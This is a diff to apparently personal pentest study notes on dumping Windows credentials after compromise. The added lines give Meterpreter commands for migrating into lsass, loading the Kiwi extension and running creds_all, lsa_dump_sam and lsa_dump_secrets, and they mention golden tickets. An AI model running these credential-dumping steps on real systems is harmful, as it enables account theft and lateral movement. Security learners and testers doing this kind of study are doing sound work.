@@ -25,7 +25,52 @@
 - Or if we have access to a meterpreter session on a Windows target, we can utilize the built-in meterpreter extenstion called Kiwi.
   - With Kiwi we don't have to upload files to the target machine.
   - We just run it from metasploit (no footprint on the target hdd).
+- Resources: [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki) | [MetaSploit Docs](https://www.offsec.com/metasploit-unleashed/mimikatz/)
 
-## Why are hashes important?
+### Why are hashes important?
 - You may not be able to crack them and get the plain-text passwords.
 - You can use them in [pass-the-hash](/07_Post-Exploitation/6_Dump_n_Crack/win_dump_n_crack.md#pass-the-hash) attacks.
+
+----
+## Techniques & Tools
+
+### Scenario & Set-Up
+- You compromised a Windows target with MetaSploit and have a meterpreter session.
+- Do some basic initial enumeration:
+```
+> sysinfo
+> pgrep lsass
+  # Note the pid
+> migrate [lsass process number]
+  # Since we are going to be interacting with the LSASS process, migrate to that specific process
+  # This gives us a 64-bit meterpreter session on the target 64-bit architecture (more stable)
+  # This gives us more stability when interacting with the LSASS process to dump hashes.
+> getuid
+  # if we have access as Administrator, no privesc needed
+> getprivs
+  # confirm we have admin privs
+```
+
+### Meterpreter Built-In Extension: Kiwi
+> Assuming the same scenario: you have compromised a Windows target with MetaSploit and currently have access via a meterpreter session. Because we are dinkin' around with the LSA, we should migrate our meterpreter session to lsass.exe. That will be more stable.
+- Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk (uploading mimiktaz.exe to the target will save it to the hard drive).
+```
+> load kiwi
+> help              # at the bottom of the help file you will get the kiwi module help
+> creds_all         # retrieve all credentials
+> lsa_dump_sam      # dump the sam database contents
+> lsa_dump_secrets  # dump the lsa secrets (unparsed)
+```
+- This will give you basically the same results as `hashdump` above (copy into a text file: hashes.txt).
+- `load kiwi` : Should get visible feedback of successful load
+- `creds_all` : will try to get everything; might give you the NTLM has of the administrator account
+- `lsa_dump_sam` : This dumps the cached contents of the SAM db
+  - REMEMBER: The SAM db is encrypted with a "syskey" and mimikatz/kiwi just gave you that key with this dump.
+- `lsa_dump_secrets` : In SOME cases this MIGHT provide you with clear text credentials.
+- If you are working within an AD (Active Directory) environment, you can run the kerberos dumps and/or create a golden ticket.
+- Handy Kiwil command: `password_change`
+  - This is NOT something you'd want to do in an enterprise environment pentest (b/c you'll change an actual account password and/or hash).
+
+### Mimikatz on the Target
+> Same scenario... If you wanted, you could upload the mimikatz Windows executable to the target (onto the target's hard drive).
+
